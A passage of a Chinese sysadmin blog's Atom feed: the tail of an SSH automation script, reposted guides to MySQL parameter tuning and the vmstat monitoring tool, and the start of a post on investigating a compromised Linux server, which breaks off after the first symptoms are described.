class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-10"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;2&lt;/span&gt;&lt;span class="crayon-sy"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-11"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-12"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-i"&gt;eof&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-13"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-14"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-15"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-e"&gt;eof&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-16"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-r"&gt;exit&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-cn"&gt;1&lt;/span&gt;&lt;span class="crayon-sy"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-17"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-18"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-19"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;"&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-20"&gt;&lt;span class="crayon-h"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="crayon-st"&gt;return&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-sy"&gt;$&lt;/span&gt;&lt;span class="crayon-sy"&gt;?&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-21"&gt;&lt;span class="crayon-sy"&gt;}&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-22"&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line" id="crayon-53145a9320456801978064-23"&gt;&lt;span class="crayon-e"&gt;auto_smart_ssh &lt;/span&gt;&lt;span class="crayon-e"&gt;passwd &lt;/span&gt;&lt;span class="crayon-i"&gt;user&lt;/span&gt;&lt;span class="crayon-sy"&gt;@&lt;/span&gt;&lt;span class="crayon-e"&gt;host &lt;/span&gt;&lt;span class="crayon-r"&gt;ls&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;/&lt;/span&gt;&lt;span class="crayon-t"&gt;var&lt;/span&gt;&lt;/div&gt;&lt;div class="crayon-line crayon-striped-line" id="crayon-53145a9320456801978064-24"&gt;&lt;span class="crayon-r"&gt;echo&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-o"&gt;-&lt;/span&gt;&lt;span class="crayon-i"&gt;e&lt;/span&gt;&lt;span class="crayon-h"&gt; &lt;/span&gt;&lt;span class="crayon-s"&gt;"\n---Exit Status: $?"&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;

                &lt;/tr&gt;

            &lt;/table&gt;

        &lt;/div&gt;

    &lt;/div&gt;
</code></pre>

<!-- [Format Time: 0.0055 seconds] -->


<p>B
B
B
B
B</p>

<p></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mysql参数优化]]></title>
    <link href="http://archulate.github.io/blog/2013/10/13/mysql-optimizing/"/>
    <updated>2013-10-13T18:55:28+08:00</updated>
    <id>http://archulate.github.io/blog/2013/10/13/mysql-optimizing</id>
    <content type="html"><![CDATA[<!--more-->


<p>   <div class="Blog_wz1" style='word-wrap: break-word;'></p>

<pre><code>        Mysql参数优化对于新手来讲，是比较难懂的东西，其实这个参数优化，是个很复杂的东西，对于不同的网站，及其在线量，访问量，帖子数量，&lt;span href="http://bbs.chinaunix.net/tag.php?name=%CD%F8%C2%E7" onclick="tagshow(event)" class="t_tag"&gt;网络&lt;/span&gt;情况，以及机器硬件配置都有关系，优化不可能一次性
</code></pre>

<p>完成，需要不断的观察以及调试，才有可能得到最佳效果。<br></p>

<br>


<p>　　下面先说我的<span href="http://bbs.chinaunix.net/tag.php?name=%B7%FE%CE%F1%C6%F7" onclick="tagshow(event)" class="t_tag">服务器</span>的硬件以及论坛情况，<br></p>

<br>


<p>　　CPU: 2颗四核Intel Xeon 2.00GHz<br></p>

<br>


<p>　　<span href="http://bbs.chinaunix.net/tag.php?name=%C4%DA%B4%E6" onclick="tagshow(event)" class="t_tag">内存</span>: 4GB DDR<br></p>

<br>


<p>　　<span href="http://bbs.chinaunix.net/tag.php?name=%D3%B2%C5%CC" onclick="tagshow(event)" class="t_tag">硬盘</span>: SCSI 146GB<br></p>

<br>


<p>　　论坛：在线会员 一般在 5000 人左右 &ndash; 最高记录是 13264.<br></p>

<br>


<p>　　下面，我们根据以上硬件配置结合一份已经做过一次优化的my.cnf进行分析说明：有些参数可能还得根据论坛的变化情况以及程序员的程序进行再调整。<br></p>

<br>


<p>　　[<span href="http://bbs.chinaunix.net/tag.php?name=mysql" onclick="tagshow(event)" class="t_tag">mysql</span>d]<br></p>

<br>


<p>　　port = 3306<br></p>

<br>


<p>　　<span href="http://bbs.chinaunix.net/tag.php?name=server" onclick="tagshow(event)" class="t_tag">server</span>id = 1<br></p>

<br>


<p>　　socket = /tmp/mysql.sock<br></p>

<br>


<p>　　skip-locking # 避免MySQL的外部锁定，减少出错几率增强稳定性。 skip-name-resolve<br></p>

<br>


<p>　　禁止MySQL对外部连接进行<span href="http://bbs.chinaunix.net/tag.php?name=DNS" onclick="tagshow(event)" class="t_tag">DNS</span>解析，使用这一选项可以消除MySQL进行DNS</p>

<p>解析的时间。但需要注意，如果开启该选项，则所有远程主机连接授权都要使用IP地址方式，否则MySQL将无法正常处理连接请求!<br></p>

<br>


<p>　　back_log = 500<br></p>

<br>


<p>　　要求 MySQL</p>

<p>能有的连接数量。当主要MySQL线程在一个很短时间内得到非常多的连接请求，这就起作用，然后主线程花些时间(尽管很短)检查连接并且启动一个新线程。<br></p>

<br>


<p>　　back_log值指出在MySQL暂时停止回答新请求之前的短时间内多少个请求可以被存在堆栈中。只有如果期望在一个短时间内有很多连接，你需要增</p>

<p>加它，换句话说，这值对到来的TCP/IP连接的侦听队列的大小。你的操作<span href="http://bbs.chinaunix.net/tag.php?name=%CF%B5%CD%B3" onclick="tagshow(event)" class="t_tag">系统</span>在这个队列大小上有它自己的限制。试图设定</p>

<p>back_log高于你的操作系统的限制将是无效的。当你观察你的主机进程列表，发现大量 264084 | unauthenticated user</p>

<p> | xxx.xxx.xxx.xxx | NULL | Connect | NULL | login | NULL 的待连接进程时，就要加大</p>

<p>back_log 的值了。默认数值是50，我把它改为500。<br></p>

<br>


<p>　　key_buffer_size = 384M<br></p>

<br>


<p>　　#</p>

<p>key_buffer_size指定用于索引的缓冲区大小，增加它可得到更好处理的索引(对所有读和多重写)，到你能负担得起那样多。如果你使它太大，系</p>

<p>统将开始换页并且真的变慢了。对于内存在4GB左右的<span href="http://bbs.chinaunix.net/tag.php?name=%B7%FE%CE%F1" onclick="tagshow(event)" class="t_tag">服务</span>器该参数可设置为384M或512M。通过检查状态</p>

<p>值Key_read_requests和Key_reads,可以知道key_buffer_size设置是否合理。比例key_reads /</p>

<p>key_read_requests应该尽可能的低，至少是1:100，1:1000更好(上述状态值可以使用SHOW STATUS LIKE</p>

<p>‘key_read%’获得)。注意：该参数值设置的过大反而会是服务器整体效率降低!<br></p>

<br>


<p>　　max_allowed_packet = 32M<br></p>

<br>


<p>　　增加该变量的值十分安全，这是因为仅当需要时才会分配额外内存。例如，仅当你发出长查询或mysqld必须返回大的结果行时mysqld才会分配更多</p>

<p>内存。该变量之所以取较小默认值是一种预防措施，以捕获客户端和服务器之间的错误信息包，并确保不会因偶然使用大的信息包而导致内存溢出。<br></p>

<br>


<p>　　table_cache = 512<br></p>

<br>


<p>　　table_cache指定表高速缓存的大小。每当MySQL访问一个表时，如果在表缓冲区中还有空间，该表就被打开并放入其中，这样可以更快地访问</p>

<p>表内容。通过检查峰值时间的状态值Open_tables和Opened_tables，可以决定是否需要增加table_cache的值。如果你发现</p>

<p>open_tables等于table_cache，并且opened_tables在不断增长，那么你就需要增加table_cache的值了(上述状</p>

<p>态值可以使用SHOW STATUS LIKE</p>

<p>‘Open%tables’获得)。注意，不能盲目地把table_cache设置成很大的值。如果设置得太高，可能会造成<span href="http://bbs.chinaunix.net/tag.php?name=%CE%C4%BC%FE" onclick="tagshow(event)" class="t_tag">文件</span>描述符不足，从而造成性能不稳定或者连接失败。<br></p>

<br>


<p>sort_buffer_size = 4M<br></p>

<br>


<p>　　查询排序时所能使用的缓冲区大小。注意：该参数对应的分配内存是每连接独占!如果有100个连接，那么实际分配的总共排序缓冲区大小为100 × 4</p>

<p> = 400MB。所以，对于内存在4GB左右的服务器推荐设置为4-8M。<br></p>

<br>


<p>　　read_buffer_size = 4M<br></p>

<br>


<p>　　读查询操作所能使用的缓冲区大小。和sort_buffer_size一样，该参数对应的分配内存也是每连接独享!<br></p>

<br>


<p>　　join_buffer_size = 8M<br></p>

<br>


<p>　　联合查询操作所能使用的缓冲区大小，和sort_buffer_size一样，该参数对应的分配内存也是每连接独享!<br></p>

<br>


<p>　　myisam_sort_buffer_size = 64M<br></p>

<br>


<p>　　MyISAM表发生变化时重新排序所需的缓冲<br></p>

<br>


<p>　　query_cache_size = 64M<br></p>

<br>


<p>　　指定MySQL查询缓冲区的大小。可以通过在MySQL控制台执行以下命令观察：<br></p>

<br>


<p>　　# &gt; SHOW VARIABLES LIKE &lsquo;%query_cache%&rsquo;; # &gt; SHOW STATUS LIKE</p>

<p>&lsquo;Qcache%&rsquo;; # 如果Qcache_lowmem_prunes的值非常大，则表明经常出现缓冲不够的情况;<br></p>

<br>


<p>　　如果Qcache_hits的值非常大，则表明查询缓冲使用非常频繁，如果该值较小反而会影响效率，那么可以考虑不用查询缓</p>

<p>冲;Qcache_free_blocks，如果该值非常大，则表明缓冲区中碎片很多。<br></p>

<br>


<p>　　thread_cache_size = 64<br></p>

<br>


<p>　　可以复用的保存在中的线程的数量。如果有，新的线程从缓存中取得，当断开连接的时候如果有空间，客户的线置在缓存中。如果有很多新的线程，为了提高性</p>

<p>能可以这个变量值。通过比较 Connections 和 Threads_created 状态的变量，可以看到这个变量的作用<br></p>

<br>


<p>　　tmp_table_size = 256M<br></p>

<br>


<p>　　max_connections = 1000<br></p>

<br>


<p>　　指定MySQL允许的最大连接进程数。如果在访问论坛时经常出现Too Many Connections的错误提示，则需要增大该参数值。<br></p>

<br>


<p>　　max_connect_errors = 10000000<br></p>

<br>


<p>　　对于同一主机，如果有超出该参数值个数的中断错误连接，则该主机将被禁止连接。如需对该主机进行解禁，执行：FLUSH HOST;。<br></p>

<br>


<p>　　wait_timeout = 10<br></p>

<br>


<p>　　指定一个请求的最大连接时间，对于4GB左右内存的服务器可以设置为5-10。<br></p>

<br>


<p>　　thread_concurrency = 8<br></p>

<br>


<p>　　该参数取值为服务器逻辑CPU数量×2，在本例中，服务器有2颗物理CPU，而每颗物理CPU又支持H.T超线程，所以实际取值为4 × 2 = 8<br></p>

<br>


<p>　　skip-networking<br></p>

<br>


<p>　　开启该选项可以彻底关闭MySQL的TCP/IP连接方式，如果WEB服务器是以远程连接的方式访问MySQL<span href="http://bbs.chinaunix.net/tag.php?name=%CA%FD%BE%DD" onclick="tagshow(event)" class="t_tag">数据</span>库服务器则不要开启该选项!否则将无法正常连接!<br></p>

<br>


<p>　　long_query_time = 10<br></p>

<br>


<p>　　log-slow-queries =<br></p>

<br>


<p>　　log-queries-not-using-indexes<br></p>

<br>


<p>　　开启慢查询日志( slow query log )<br></p>

<br>


<p>　　慢查询日志对于跟踪有问题的查询非常有用。它记录所有查过long_query_time的查询，如果需要，还可以记录不使用索引的记录。下面是一个</p>

<p>慢查询日志的例子：<br></p>

<br>


<p>　　开启慢查询日志，需要设置参数log_slow_queries、long_query_times、log-queries-not-using-</p>

<p>indexes。<br></p>

<br>


<p>　　log_slow_queries指定日志文件，如果不提供文件名，MySQL将自己产生缺省文件名。long_query_times指定慢查询的</p>

<p>阈值，缺省是10秒。log-queries-not-using-indexes是4.1.0以后引入的参数，它指示记录不使用索引的查询。设置</p>

<p>long_query_time=10<br></p>

<br>




<br>


<p>　另外附上使用show status命令查看mysql状态相关的值及其含义：<br></p>

<br>


<p>　　使用show status命令<br></p>

<br>


<p>　　含义如下:<br></p>

<br>


<p>　　aborted_clients 客户端非法中断连接次数<br></p>

<br>


<p>　　aborted_connects 连接mysql失败次数<br></p>

<br>


<p>　　com_xxx xxx命令执行次数,有很多条<br></p>

<br>


<p>　　connections 连接mysql的数量<br></p>

<br>


<p>　　Created_tmp_disk_tables 在磁盘上创建的临时表<br></p>

<br>


<p>　　Created_tmp_tables 在内存里创建的临时表<br></p>

<br>


<p>　　Created_tmp_files 临时文件数<br></p>

<br>


<p>　　Key_read_requests The number of requests to read a key block from the</p>

<p>cache<br></p>

<br>


<p>　　Key_reads The number of physical reads of a key block from disk<br></p>

<br>


<p>　　Max_u<span href="http://bbs.chinaunix.net/tag.php?name=sed" onclick="tagshow(event)" class="t_tag">sed</span>_connections 同时使用的连接数<br></p>

<br>


<p>　　Open_tables 开放的表<br></p>

<br>


<p>　　Open_files 开放的文件<br></p>

<br>


<p>　　Opened_tables 打开的表<br></p>

<br>


<p>　　Questions 提交到server的查询数<br></p>

<br>


<p>　　Sort_merge_passes 如果这个值很大,应该增加my.cnf中的sort_buffer值<br></p>

<br>


<p>　　Uptime 服务器已经工作的秒数<br></p>

<br>


<p>　　提升性能的建议:<br></p>

<br>


<p>　　1.如果opened_tables太大,应该把my.cnf中的table_cache变大<br></p>

<br>


<p>　　2.如果Key_reads太大,则应该把my.cnf中key_buffer_size变大.可以用</p>

<p>Key_reads/Key_read_requests计算出cache失败率<br></p>

<br>


<p>　　3.如果Handler_read_rnd太大,则你写的SQL语句里很多查询都是要扫描整个表,而没有发挥索引的键的作用<br></p>

<br>


<p>　　4.如果Threads_created太大,就要增加my.cnf中thread_cache_size的值.可以用</p>

<p>Threads_created/Connections计算cache命中率<br></p>

<br>


<p>　　5.如果Created_tmp_disk_tables太大,就要增加my.cnf中tmp_table_size的值,用基于内存的临时表代替基</p>

<p>于磁盘的</p>

<pre><code>               &lt;/div&gt;
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux系统监控工具之vmstat详解]]></title>
    <link href="http://archulate.github.io/blog/2013/10/03/vmstat/"/>
    <updated>2013-10-03T18:46:53+08:00</updated>
    <id>http://archulate.github.io/blog/2013/10/03/vmstat</id>
    <content type="html"><![CDATA[<!--more-->


<p>vmstat是一个十分有用的Linux系统监控工具，使用vmstat命令可以得到关于进程、内存、内存分页、堵塞IO、traps及CPU活动的信息。</p>




<p><span style="font-family: 黑体">51CTO编辑推荐：</span><a href="http://os.51cto.com/art/201005/200741.htm" target="_blank"><span style="font-family: 黑体">Linux监控工具大全</span></a></p>




<p><strong>一、前言</strong></p>




<p>很显然从名字中我们就可以知道vmstat是一个查看虚拟内存（Virtual Memory）使用状况的工具，但是怎样通过vmstat来发现系统中的瓶颈呢？在回答这个问题前，还是让我们回顾一下Linux中关于虚拟内存相关内容。</p>




<p><strong>二、虚拟内存运行原理</strong></p>




<p>在系统中运行的每个进程都需要使用到内存，但不是每个进程都需要每时每刻使用系统分配的内存空间。当系统运行所需内存超过实际的物理内存，内核会释放某些进程所占用但未使用的部分或所有物理内存，将这部分资料存储在磁盘上直到进程下一次调用，并将释放出的内存提供给有需要的进程使用。</p>




<p>在Linux内存管理中，主要是通过&ldquo;调页Paging&rdquo;和&ldquo;交换Swapping&rdquo;来完成上述的内存调度。调页算法是将内存中最近不常使用的页面换到磁盘上，把活动页面保留在内存中供进程使用。交换技术是将整个进程，而不是部分页面，全部交换到磁盘上。</p>




<p>分页(Page)写入磁盘的过程被称作Page-Out，分页(Page)从磁盘重新回到内存的过程被称作Page-In。当内核需要一个分页时，但发现此分页不在物理内存中(因为已经被Page-Out了)，此时就发生了分页错误（Page Fault）。</p>




<p>当系统内核发现可运行内存变少时，就会通过Page-Out来释放一部分物理内存。经管Page-Out不是经常发生，但是如果Page-out频繁不断的发生，直到当内核管理分页的时间超过运行程式的时间时，系统效能会急剧下降。这时的系统已经运行非常慢或进入暂停状态，这种状态亦被称作thrashing(颠簸)。</p>




<p><strong>三、使用vmstat</strong></p>




<p><strong>1.用法</strong></p>




<p>vmstat [-a] [-n] [-S unit] [delay [ count]]</p>




<p>vmstat [-s] [-n] [-S unit]</p>




<p>vmstat [-m] [-n] [delay [ count]]</p>




<p>vmstat [-d] [-n] [delay [ count]]</p>




<p>vmstat [-p disk partition] [-n] [delay [ count]]</p>




<p>vmstat [-f]</p>




<p>vmstat [-V]</p>




<p>-a：显示活跃和非活跃内存</p>




<p>-f：显示从系统启动至今的fork数量 。引申閱讀： http://www.cnblogs.com/leoo2sk/archive/2009/12/11/talk-about-fork-in-linux.html</p>




<p>-m：显示slabinfo</p>




<p>-n：只在开始时显示一次各字段名称。</p>




<p>-s：显示内存相关统计信息及多种系统活动数量。</p>




<p>delay：刷新时间间隔。如果不指定，只显示一条结果。</p>




<p>count：刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。</p>




<p>-d：显示磁盘相关统计信息。</p>




<p>-p：显示指定磁盘分区统计信息</p>




<p>-S：使用指定单位显示。参数有 k 、K 、m 、M ，分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes）</p>




<p>-V：显示vmstat版本信息。</p>




<p></p>




<p><strong>2.使用说明</strong></p>




<p>例子1：每2秒输出一条结果</p>




<p><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;&#8217; onmousewheel = &#8216;javascript:return big(this)&#8217; border=&#8221;0&#8221; alt=&#8221;&#8221; small=&#8221;0&#8221; src=&#8221;http://images.51cto.com/files/uploadimg/20100519/1023590.jpg&#8221; /></p>




<p>字段说明：</p>




<p>Procs（进程）：</p>




<p>r: 运行队列中进程数量</p>




<p>b: 等待IO的进程数量</p>




<p>Memory（内存）：</p>




<p>swpd: 使用虚拟内存大小</p>




<p>free: 可用内存大小</p>




<p>buff: 用作缓冲的内存大小</p>




<p>cache: 用作缓存的内存大小</p>




<p>Swap：</p>




<p>si: 每秒从交换区写到内存的大小</p>




<p>so: 每秒写入交换区的内存大小</p>




<p>IO：（现在的Linux版本块的大小为1024bytes）</p>




<p>bi: 每秒读取的块数</p>




<p>bo: 每秒写入的块数</p>




<p>系统：</p>




<p>in: 每秒中断数，包括时钟中断。</p>




<p>cs: 每秒上下文切换数。</p>




<p>CPU（以百分比表示）：</p>




<p>us: 用户进程执行时间(user time)</p>




<p>sy: 系统进程执行时间(system time)</p>




<p>id: 空闲时间(包括IO等待时间)</p>




<p>wa: 等待IO时间</p>




<p>例子2：显示活跃和非活跃内存</p>




<p><img  class='fit-image' onload='javascript:if(this.width>498)this.width=498;&#8217; onmousewheel = &#8216;javascript:return big(this)&#8217; border=&#8221;0&#8221; alt=&#8221;&#8221; small=&#8221;0&#8221; src=&#8221;http://images.51cto.com/files/uploadimg/20100519/1023591.jpg&#8221; /></p>




<p>使用-a选项显示活跃和非活跃内存时，所显示的内容除增加inact和active外，其他显示内容与例子1相同。</p>




<p>字段说明：</p>




<p>Memory（内存）：</p>




<p>inact: 非活跃内存大小（当使用-a选项时显示）</p>




<p>active: 活跃的内存大小（当使用-a选项时显示）</p>




<p><em>本文来源：http://hi.baidu.com/imlidapeng/blog/item/51872329329ab8335243c1c9.html</em></p>




<p>【编辑推荐】</p>




<ol>

    <li><a target="_blank" href="http://os.51cto.com/art/201005/200652.htm">Linux系统监控工具之top详解</a></li>

    <li><a target="_blank" href="http://os.51cto.com/art/201005/200285.htm">四大Linux备份工具比较与操作实例</a></li>

    <li><a target="_blank" href="http://os.51cto.com/art/201004/193498.htm">Linux管理员不可不知的五大命令+工具</a></li>

</ol>




<div align="right">【责任编辑：<a class="ln" href="mailto:yangsai@51cto.com">杨赛</a> TEL：（010）68476606】</div>


<br> 


<p class="blank10"></p>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[一次服务器被入侵后的分析]]></title>
    <link href="http://archulate.github.io/blog/2013/09/23/hack-analyse/"/>
    <updated>2013-09-23T18:42:23+08:00</updated>
    <id>http://archulate.github.io/blog/2013/09/23/hack-analyse</id>
    <content type="html"><![CDATA[<!--more-->


<p>最近有个朋友让我去帮他看一下他的Linux服务器，说是Apache启动不了，有很多诡异的情况。后来证明绝不是Apache启动不了这么简单。</p>




<p>登上服务器之后随便看了下,最先引起我注意的是&rdquo;ls&rdquo;命令的输出：</p>




<p></p>




<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;ls:&nbsp;invalid&nbsp;option&nbsp;--&nbsp;h&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;Try&nbsp;`ls&nbsp;--help'&nbsp;for&nbsp;more&nbsp;information.&nbsp;</span></li></ol></pre>




<p></p>




<p>为什么&rdquo;ls&rdquo;默认加了&rdquo;-h&rdquo;参数呢?我用&rdquo;alias&rdquo;命令看了一下,然后取消了这个别名之后&rdquo;ls&rdquo;就工作正常了。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;alias&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;alias&nbsp;<span class="attribute">ls</span><span>=</span><span class="attribute-value">'ls&nbsp;-sh&nbsp;--color=auto'</span><span>&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;lars@server1:~$&nbsp;unalias&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;lars@server1:~$&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;backup&nbsp;</span></li><li><span>&nbsp;&nbsp;lars@server1:~$&nbsp;</span></li></ol></pre>




<p></p>




<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;sudo&nbsp;/etc/init.d/apache2&nbsp;start&nbsp;</span></span></li><li><span>&nbsp;&nbsp;Password:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;*&nbsp;Starting&nbsp;apache&nbsp;2.0&nbsp;web&nbsp;server...&nbsp;</span></li><li><span>&nbsp;&nbsp;(2):&nbsp;apache2:&nbsp;could&nbsp;not&nbsp;open&nbsp;error&nbsp;log&nbsp;file&nbsp;/var/log/apache2/error.log.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;Unable&nbsp;to&nbsp;open&nbsp;logs&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;...fail!&nbsp;</span></li></ol></pre>




<p></p>




<p>纳尼?赶紧去&rdquo;/var/log/&rdquo;目录一看,果然&rdquo;apache2/&rdquo;文件夹不见了.而且这个目录下其他的文件夹,比如&rdquo;mysql/&rdquo;,&rdquo;samba/&rdquo;也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题。</p>




<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;sudo&nbsp;-i&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Password:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;ls:&nbsp;unrecognized&nbsp;prefix:&nbsp;do&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;ls:&nbsp;unparsable&nbsp;value&nbsp;for&nbsp;LS_COLORS&nbsp;environment&nbsp;variable&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;total&nbsp;44&nbsp;</span></li><li 